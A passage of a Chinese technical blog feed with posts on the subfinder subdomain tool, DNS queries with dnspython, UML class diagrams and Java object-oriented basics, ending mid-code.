class="code"><pre><code class="hljs powershell">go get <span class="hljs-literal">-v</span> github.com/projectdiscovery/subfinder/v2/cmd/subfinder<br></code></pre></td></tr></table></figure><p>安装完成之后，首先查看帮助信息：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">subfinder <span class="hljs-literal">-h</span><br></code></pre></td></tr></table></figure><h2 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h2><h2 id="三、使用"><a href="#三、使用" class="headerlink" title="三、使用"></a>三、使用</h2><p>最简单的使用方法，直接在参数中使用 <code>-d</code> 参数指定目标域名：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">subfinder <span class="hljs-literal">-d</span> xazlsec.com<br></code></pre></td></tr></table></figure><p>使用 <code>-v</code> 参数看详情：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">subfinder <span class="hljs-literal">-v</span> <span class="hljs-literal">-d</span> xazlsec.com<br></code></pre></td></tr></table></figure><p>结果比较多的情况下，可以使用 <code>-o</code> 参数输出到文件中。</p><p>如果要搜索目标比较多的情况下，可以使用 <code>-dL</code> 参数指定目标域名所在文件：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">subfinder <span class="hljs-literal">-dL</span> domain.txt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>HW</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HW</tag>
      
      <tag>Tools</tag>
      
      <tag>Subdomain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python modules-DNSPython</title>
    <link href="/2021/10/10/Code/Python/Python%20modules-DNSPython/"/>
    <url>/2021/10/10/Code/Python/Python%20modules-DNSPython/</url>
    
    <content type="html"><![CDATA[<h1 id="Python-modules"><a href="#Python-modules" class="headerlink" title="Python modules"></a>Python modules</h1><h2 id="DNSPython（域名解析模块）"><a href="#DNSPython（域名解析模块）" class="headerlink" title="DNSPython（域名解析模块）"></a>DNSPython（域名解析模块）</h2><p>dnspython是python实现的一个DNS工具包，它支持记录类型、查询、传输并动态更新ZONE信息等等。据说dnspython可以代替dig、nslookup等工具。</p><p>python模块域名解析方法讲解</p><p>平常测试DNS的时候，有些操作手动处理不方便，需要写个脚本来实现，这是就会想到使用dnspython模块，它提供了大量的DNS处理方法，我们知道最常用的方法就是域名查询，dnspyhton库提供一个解析器类（resolver）,我们可以使用它query方法实现域名查询功能。这里要说一下query：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">query(self, qname, rdtype = <span class="hljs-number">1</span>, rdclass = <span class="hljs-number">1</span>, tcp = <span class="hljs-literal">False</span>, source = <span class="hljs-literal">None</span>, raise_on_no_answer = <span class="hljs-literal">True</span>, source_port = <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>qname：查询的域名。<br>rdtype :指定RR资源的类型</p><p>全部的rdtype类型为：</p><p><img src="https://img-blog.csdnimg.cn/20200831150356612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZW4xNDE1ODg2MDQ0,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>常用的有以下几种:</p><p>A记录：将主机名转换成IP地址<br>MX记录：邮件交换记录，定义邮件服务器的域名<br>CNAME记录：别名记录，实现域名间的映射<br>NS记录：标记区域的域名服务器及授权子域<br>PTR记录：反向解析，与A记录相反，将IP地址转换为主机名<br>SOA记录：SOA标记，一个起始授权区的定义</p><p>rdclass: 指定网络类型，可选的值为CH、IN。其中IN为默认的，使用最广泛。</p><p><img src="https://img-blog.csdnimg.cn/20200831151058593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZW4xNDE1ODg2MDQ0,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>tcp ：指定查询是否启动TCP协议，默认不启动。</p><p>source与source_port：指定的查询源地址与端口。</p><p>raise_on_no_answer ：指定查询无应答时是否触发异常，默认为True。</p><p>下面我们开始对常见解析类型进行说明。</p><p>解析类型说明</p><p>A记录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python38</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> dns.resolver<br><br>domain = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Please input an domain: &#x27;</span>)  <span class="hljs-comment">#输入域名地址</span><br>A = dns.resolver.query(domain, <span class="hljs-string">&#x27;A&#x27;</span>)  <span class="hljs-comment">#查询记录为A记录</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> A.response.answer:<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i.items:<br><span class="hljs-keyword">if</span> j.rdtype == <span class="hljs-number">1</span>: <span class="hljs-comment">#加判断，不然会出现AttributeError: &#x27;CNAME&#x27; object has no attribute &#x27;address&#x27;</span><br><br><span class="hljs-built_in">print</span>(j.address)<br></code></pre></td></tr></table></figure><p>运行代码查看结果，这里以www.baidu.com域名为例：</p><p>这样子我们就将www.baidu.com的域名解析出来了。 来看看效果：</p><p>MZ记录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python38</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> dns.resolver<br>domain = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Input an domain : &#x27;</span>)<br>MX = dns.resolver.query(domain, <span class="hljs-string">&#x27;MX&#x27;</span>)   <span class="hljs-comment"># 指定解析类型为MX记录</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> MX:                            <span class="hljs-comment"># 遍历回应结果</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;MX preference =&#x27;</span>, i.preference, <span class="hljs-string">&#x27;mail exchanger =&#x27;</span>, i.exchange)<br></code></pre></td></tr></table></figure><p>运行代码查看结果，这里以qq.com域名为例：</p><p>其中我们可以看到preference值（优先级）和exchange值（交换地址），其中优先级默认为10，MX记录可以通过设置优先级实现主辅服务器设置，”优先级”中的数字越小表示级别越高，“优先级”仅对MX记录有效。</p><p>NS记录</p><p>NS（Name Server）域名服务器记录。用来表明由哪台服务器对该域名进行解析。在注册域名时，总有默认的DNS服务器，每个注册的域名都是由一个DNS域名服务器来进行解析的。</p><p>下面实现NS记录查询方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python38</span><br><br><span class="hljs-keyword">import</span> dns.resolver<br>domain = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Input an domain : &#x27;</span>)<br>NS = dns.resolver.query(domain, <span class="hljs-string">&#x27;NS&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> NS.response.answer:<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i.items:<br><span class="hljs-built_in">print</span>(j.to_text())<br><br></code></pre></td></tr></table></figure><p>只限输入一级域名，如baidu.com。如果输入二级或多级域名，如:www.baidu.com，则是错误的，我们可以试一下，验证问题：</p><p>CNAME记录</p><p>使用CNAME时，CNAME的目标主机地址只能使用主机名，不能使用IP地址。主机名前不能有任何其他前缀，如：<a href="http://等是不被允许的。">http://等是不被允许的。</a></p><p>来看看下面代码实现CNAME记录方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python38</span><br><br><span class="hljs-keyword">import</span> dns.resolver<br>domain = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Input an domain: &#x27;</span>)<br>CNAME = dns.resolver.query(domain,<span class="hljs-string">&#x27;CNAME&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> CNAME.response.answer:<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i.items:<br><span class="hljs-built_in">print</span>(j.to_text())<br><br></code></pre></td></tr></table></figure><p>运行结果如下：</p><p>运行结果出现www.a.shifen.com域名，这个域名就是www.baidu.com的别名指向。相当于用子域名来代替ip地址，优点是如果ip地址变化，只需要改动子域名的解析，而不需要逐一改变ip地址解析。</p><p>DNS域名轮询业务监控</p><p>大部分的DNS解析器都是一个域名对应一个IP地址，但是通过DNS轮询技术可以做到一个域名对应多个IP，从而实现最简单高效的负载平衡，不过此方最大的弊端是目标主机不可用时无法被自动剔除，因此做好业务主机的服务可用监控至关重要。</p><p><img src="https://img-blog.csdnimg.cn/20200902224148694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZW4xNDE1ODg2MDQ0,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（图片来源于网络）</p><p>下面我们来实现域名的解析，获取域名的所有A记录解析IP列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python38</span><br><br><span class="hljs-keyword">import</span> dns.resolver<br><span class="hljs-keyword">import</span> httplib2<br><br>iplist = []<br>appdomain = <span class="hljs-string">&quot;www.baidu.com&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_iplist</span>(<span class="hljs-params">domain=<span class="hljs-string">&quot;&quot;</span></span>):</span><br>    <span class="hljs-keyword">try</span>:<br>        A = dns.resolver.query(domain,<span class="hljs-string">&quot;A&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;dns resolver error:&quot;</span> + <span class="hljs-built_in">str</span>(e))<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> A.response.answer:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i.items:<br>            <span class="hljs-keyword">if</span> j.rdtype == <span class="hljs-number">1</span>:<br>                iplist.append(j.address)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkip</span>(<span class="hljs-params">ip</span>):</span><br>    checkurl = <span class="hljs-string">&#x27;http://&#x27;</span> + ip + <span class="hljs-string">&quot;:80&quot;</span><br>    getcontent = <span class="hljs-string">&quot;&quot;</span><br>    httplib2.socket.setdefaulttimeout(<span class="hljs-number">5</span>)<br>    conn = httplib2.Http()<br><br>    <span class="hljs-keyword">try</span>:<br>        resp,getcontent=conn.request(checkurl)<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-keyword">if</span>  resp[<span class="hljs-string">&#x27;status&#x27;</span>]== <span class="hljs-string">&quot;200&quot;</span>:<br>            <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot;[OK]&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot;[Error]&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">if</span> get_iplist(appdomain) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(iplist) &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> iplist:<br>            checkip(ip)<br><br></code></pre></td></tr></table></figure><p>运行结果如下：</p><p>从结果可以看出，域名www.baidu.com解析出3个IP地址，并且服务都是正常的。上面的代码，第一步通过dns.resolver.query()方法获取业务域名A记录信息，查询出所有IP地址列表，再使用httplib模块的request()方法以GET方式请求监控页面，监控业务所有服务的IP是否服务正常。</p><p>总结</p><p>我们知道将IP地址转换为可读格式或单词后，便称为域名。在python中，域名到IP地址的转换由python模块dnspython管理。它支持记录类型、查询、传输并动态更新ZONE信息的方法。感兴趣的朋友，可以去看看dnspython源码。</p><p>原文链接：<a href="https://blog.csdn.net/chen1415886044/article/details/108320745">https://blog.csdn.net/chen1415886044/article/details/108320745</a></p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Code</tag>
      
      <tag>Pyhton modules</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>类图</title>
    <link href="/2021/10/03/Code/Java/%E7%B1%BB%E5%9B%BE/"/>
    <url>/2021/10/03/Code/Java/%E7%B1%BB%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h1><h2 id="什么是类图"><a href="#什么是类图" class="headerlink" title="什么是类图"></a>什么是类图</h2><p>类图是显示了模型的静态结构，特别是模型中存在的类，类的内部结构以及它们与其他类的关系等。类图是面向对象建模的主要组成部分。</p><h2 id="类图的组成"><a href="#类图的组成" class="headerlink" title="类图的组成"></a>类图的组成</h2><p>在UML类图中，类一般由三部分组成：</p><ul><li><p>类名：每个类都必须有一个名字。（正体字说明类是可被实例化的，斜体字说明类为抽象类）</p></li><li><p>属性：类的成员变量。<br>UML规定属性的表示方式为：(可见性) 名称:类型 [ = 缺省值 ]</p></li><li>方法：类的成员方法。<br>UML规定操作的表示方式为：(可见性) 名称(参数列表) [ : 返回类型]</li></ul><p>加号（+）表示public；减号（-）表示private；井号(#)表示protected；省略这些修饰符表示具有package（包）级别的可见性。</p><p><img src="/2021/10/03/Code/Java/%E7%B1%BB%E5%9B%BE/f1fcb4a48cb5477849df5427ab39ba55.jpg" alt="4"></p><h2 id="类间关系"><a href="#类间关系" class="headerlink" title="类间关系"></a>类间关系</h2><h3 id="泛化关系-generalization"><a href="#泛化关系-generalization" class="headerlink" title="泛化关系(generalization)"></a>泛化关系(generalization)</h3><p>是一种继承关系，表示一般与特殊的关系，它指定了子类如何特化父类的所有特征和行为。</p><h3 id="实现关系-realize"><a href="#实现关系-realize" class="headerlink" title="实现关系(realize)"></a>实现关系(realize)</h3><p>是一种类与接口的关系，表示类是接口所有特征和行为的实现.</p><h3 id="聚合关系-aggregation"><a href="#聚合关系-aggregation" class="headerlink" title="聚合关系(aggregation)"></a>聚合关系(aggregation)</h3><p>是整体与部分的关系，且部分可以离开整体而单独存在。</p><p>与组合关系不同的是，整体和部分不是强依赖的，即使整体不存在了，部分仍然存在；</p><h3 id="组合关系-composition"><a href="#组合关系-composition" class="headerlink" title="组合关系(composition)"></a>组合关系(composition)</h3><p>是整体与部分的关系，但部分不能离开整体而单独存在。如公司和部门是整体和部分的关系，没有公司就不存在部门。</p><p>组合（Composition）关系也表示的是一种整体和部分的关系，但是在组合关系中整体对象可以控制成员对象的生命周期，一旦整体对象不存在，成员对象也不存在，整体对象和成员对象之间具有同生共死的关系。</p><h3 id="关联关系-association"><a href="#关联关系-association" class="headerlink" title="关联关系(association)"></a>关联关系(association)</h3><p>是一种拥有的关系，它使一个类知道另一个类的属性和方法。</p><ul><li>双向关联：指双方都知道对方的存在，都可以调用对方的公共属性和方法。</li><li>单向关联：表示相识关系，指一方知道另一方 ，一方可以调用另一方的公共属性和方法。没有生命期的依赖。</li><li>自身关联：自己引用自己，带着一个自己的引用。</li></ul><p>在最终代码中，关联对象通常是以成员变量的形式实现的；</p><h3 id="依赖关系-dependency"><a href="#依赖关系-dependency" class="headerlink" title="依赖关系(dependency)"></a>依赖关系(dependency)</h3><p>是一种使用的关系，即一个类的实现需要另一个类的协助，所以要尽量不使用双向的互相依赖。</p><h3 id="类间关系表示"><a href="#类间关系表示" class="headerlink" title="类间关系表示"></a>类间关系表示</h3><p><img src="/2021/10/03/Code/Java/%E7%B1%BB%E5%9B%BE/3e212b19270be8e84d10939b4c8e1e23.png" alt="2020041110061614"></p><p><img src="/2021/10/03/Code/Java/%E7%B1%BB%E5%9B%BE/964fd4f768667e7c84bf4949f61b79b3.jpg" alt="1"></p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><p><img src="/2021/10/03/Code/Java/%E7%B1%BB%E5%9B%BE/0ed40334c6b17af32c77f1df9818c85f.jpg" alt="3"></p><ul><li>车的类图结构为&lt;<abstract>&gt;，表示车是一个抽象类；</abstract></li><li>它有两个继承类：小汽车和自行车；它们之间的关系为实现关系，使用带空心箭头的虚线表示；</li><li>小汽车为与SUV之间也是继承关系，它们之间的关系为泛化关系，使用带空心箭头的实线表示；</li><li>小汽车与发动机之间是组合关系，使用带实心箭头的实线表示；</li><li>学生与班级之间是聚合关系，使用带空心箭头的实线表示；</li><li>学生与身份证之间为关联关系，使用一根实线表示；</li><li>学生上学需要用到自行车，与自行车是一种依赖关系，使用带箭头的虚线表示；</li></ul>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>类图</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>面向对象</title>
    <link href="/2021/10/02/Code/Java/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    <url>/2021/10/02/Code/Java/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><h2 id="一、Java面向对象学习的三条主线"><a href="#一、Java面向对象学习的三条主线" class="headerlink" title="一、Java面向对象学习的三条主线"></a>一、Java面向对象学习的三条主线</h2><p>1、Java类及类的成员：属性、方法、构造器；代码块、内部块</p><p>2、面向对象的三大特征：封装性、继承性、多态性、（抽象性）</p><p>3、其他关键字：this、super、static、final、abstract、interface、package、import</p><h2 id="二、面向过程与面向对象"><a href="#二、面向过程与面向对象" class="headerlink" title="二、面向过程与面向对象"></a>二、面向过程与面向对象</h2><h3 id="面向过程与面向对象"><a href="#面向过程与面向对象" class="headerlink" title="面向过程与面向对象"></a>面向过程与面向对象</h3><p>面向对象：Object Oriented Programming ；面向过程：Procedure Oriented Programming</p><p>二者都是一种思想，面向对象是相对于面向过程而言的。面向过程，强调的是功能行为，以函数为最小单位，考虑怎么做。 面向对象，将功能封装进对象，强调具备了功能的对象，以类/对象为最小单位，考虑谁来做。</p><p>面向对象更加强调运用人类在日常的思维逻辑中采用的思想方法与原则，如抽象、分类、继承、聚合、多态等。</p><p><strong>“人把大象装进冰箱”</strong></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">1</span>、面向过程：强调的是功能行为，以函数为最小单位，考虑怎么做。<br><span class="hljs-number">1</span>）把冰箱门打开<br><span class="hljs-number">2</span>）抬起大象，塞进冰箱<br><span class="hljs-number">3</span>）把冰箱门关闭<br><span class="hljs-number">2</span>、面向对象：强调具备了功能的对象，以类/对象为最小单位，考虑谁来做。<br><br>人&#123;<br>打开<span class="hljs-comment">(冰箱)</span>&#123;<br>冰箱.开开<span class="hljs-comment">()</span>;<br>&#125;<br>抬起<span class="hljs-comment">(大象)</span>&#123;<br>大象.进入<span class="hljs-comment">(冰箱)</span>;<br>&#125;<br>关闭<span class="hljs-comment">(冰箱)</span>&#123;<br>冰箱.闭合<span class="hljs-comment">()</span>;<br>&#125;<br>&#125;<br>冰箱&#123;<br>开开<span class="hljs-comment">()</span>&#123;&#125;<br>闭合<span class="hljs-comment">()</span>&#123;&#125;<br>&#125;<br>大象&#123;<br>进入<span class="hljs-comment">(冰箱)</span>&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="面向对象的三个特征："><a href="#面向对象的三个特征：" class="headerlink" title="面向对象的三个特征："></a>面向对象的三个特征：</h3><ul><li><p>封装(EncapsuIation)</p></li><li><p>继承(lnheritance)</p></li><li><p>多态(Polymorphism)</p></li></ul><h3 id="面向对象的思想概述"><a href="#面向对象的思想概述" class="headerlink" title="面向对象的思想概述"></a>面向对象的思想概述</h3><p>程序员从面向过程的执行者转化成了面向对象的指挥者。</p><p><strong>面向对象分析方法分析问题的思路和步骤：</strong></p><ul><li>根据问题需要，选择问题所针对的现实世界中的实体。</li><li>从实体中寻找解决问题相关的属性和功能，这些属性和功能就形成了概念世界中的类。</li><li>把抽象的实体用计算机语言进行描述，形成计算机世界中类的定义。即借助某种程序语言，把类构造成计算机能够识别和处理的数据结构。</li><li>将类实例化成计算机世界中的对象。对象是计算机世界中解决问题的最终工具。</li></ul><h2 id="三、Java语言基本元素：类与对象"><a href="#三、Java语言基本元素：类与对象" class="headerlink" title="三、Java语言基本元素：类与对象"></a>三、Java语言基本元素：类与对象</h2><p>类（Class）和对象（Object）是面向对象的核心概念。</p><ul><li>类是对一类事物的描述，是抽象的、概念上的定义</li><li>对象是实际存在的该类事物的每个个体，因而也称为实例（instance）</li><li>“万事万物皆对象”</li></ul><p><strong>可以理解为：类 = 抽象概念的人；对象 = 实实在在的某个人</strong></p><p><strong>面向对象程序设计的重点是类的设计；类的设计，其实就是类的成员的设计</strong></p><h3 id="Java-类及类的成员"><a href="#Java-类及类的成员" class="headerlink" title="Java 类及类的成员"></a>Java 类及类的成员</h3><p>现实世界的生物体，大到鲸鱼，小到蚂蚁，都是由最基本的细胞构成的。同理，Java 代码世界是由诸多个不同功能的类构成的。现实生物世界中的细胞又是由什么构成的呢？细胞核、细胞质、······，那么，Java中用类Class来描述事物也是如此。常见的类的成员有：</p><ul><li>属性：对应类中的成员变量          Field = 属性 = 成员变量 = 域、字段；</li><li>行为：对应类中的成员方法          Method = （成员）方法 = 函数</li></ul><p>类的成员构成1.0：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//类的成员构成1.0：</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-comment">//属性</span><br>    String name;<br>    <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-keyword">boolean</span> isMarried;<br>    <span class="hljs-comment">//方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">walk</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;人走路&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">display</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;名字是: &quot;</span> +name+<span class="hljs-string">&quot;, 年龄是: &quot;</span> +age+<span class="hljs-string">&quot;, Married: &quot;</span>+isMarried;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>类的成员构成2.0：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//类的成员构成2.0：</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br><span class="hljs-comment">//属性或成员变量</span><br>String name;<br><span class="hljs-keyword">boolean</span> isMarried;<br><span class="hljs-comment">//构造器</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">()</span></span>&#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">(String name, <span class="hljs-keyword">boolean</span> im)</span></span>&#123;<br>        name = n;isMarried = im;<br>    &#125;<br><span class="hljs-comment">//方法或函数</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">walk</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;人走路&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">display</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;名字是: &quot;</span> +name+<span class="hljs-string">&quot;, Married: &quot;</span>+isMarried;<br>    &#125;<br><span class="hljs-comment">//代码块</span><br>&#123;<br>    name = <span class="hljs-string">&quot;HanMeiMei&quot;</span>;<br>    age = <span class="hljs-number">17</span>;<br>    isMarried = <span class="hljs-keyword">true</span>;<br>&#125;<br><span class="hljs-comment">//内部类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pet</span></span>&#123;<br>    String name;<br>    <span class="hljs-keyword">float</span> weight;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Java类的使用："><a href="#Java类的使用：" class="headerlink" title="Java类的使用："></a>Java类的使用：</h3><p><strong>Java类的实例化，即创建类的对象</strong> （创建类的对象 = 类的实例化 = 实例化类）</p><p>类和对象的使用（面向对象思想落地的实现）：</p><ul><li>创建类，设计类的成员</li><li>创建类的对象</li><li>通过“<strong>对象.属性</strong>”或“<strong>对象.方法</strong>”调用对象的结构</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 